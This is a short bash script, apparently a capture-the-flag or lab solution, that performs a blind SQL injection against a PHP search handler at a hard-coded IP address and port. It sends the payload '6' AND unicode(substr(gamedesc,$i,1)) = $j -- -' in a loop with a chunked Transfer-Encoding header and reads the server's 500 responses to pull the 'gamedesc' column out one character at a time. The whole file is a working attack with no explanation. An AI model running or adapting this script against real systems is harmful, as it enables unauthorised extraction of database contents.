#!/bin/bash

for i in {0..50}; do
    for j in {32..128}; do
        response=$(curl -s -o /dev/null -w "%{http_code}" "http://94.237.55.163:37788/Controllers/Handlers/SearchHandler.php" -X POST -d "search=6' AND unicode(substr(gamedesc,$i,1)) = $j -- -" -H "Transfer-Encoding: chunked")
        if [ "$response" != "500" ]; then
            char=$(printf \\$(printf '%03o' $j))
            echo -n "$char"
            break
        fi
    done
done

